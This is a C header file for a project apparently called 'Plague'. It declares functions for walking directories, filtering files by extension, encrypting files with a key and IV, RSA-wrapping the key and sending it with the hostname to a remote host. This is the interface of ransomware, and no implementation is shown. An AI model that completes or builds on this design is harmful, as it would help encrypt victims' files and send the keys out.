
#ifndef PLAGUE_PLAGUE_H
#define PLAGUE_PLAGUE_H

#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <openssl/rand.h>
#include <openssl/modes.h>
#include <openssl/rsa.h>

#define KEY_SIZE        256
#define IV_SIZE         128
#define RESPONSE_SIZE   4096

void handleError();
void print_file_content(const char *);
char *str_concat(int nb_arg, ...);
void encrypt_file(unsigned char key[], unsigned char iv[], const char *path);
int check_ext(const char *path);
char *encode_hex(const unsigned char *key, int size);
unsigned char    *decode_hex(char *hex, int size);
int send_key(char *key, char *iv, char *hostname);
char*   get_hostname();
unsigned char *rsa_encode(unsigned char *json, size_t *len);
char *bin2hex(const unsigned char *bin, size_t len);
char *base64_encode(const unsigned char *data,
                    size_t input_length,
                    size_t *output_length);

#endif //PLAGUE_PLAGUE_H
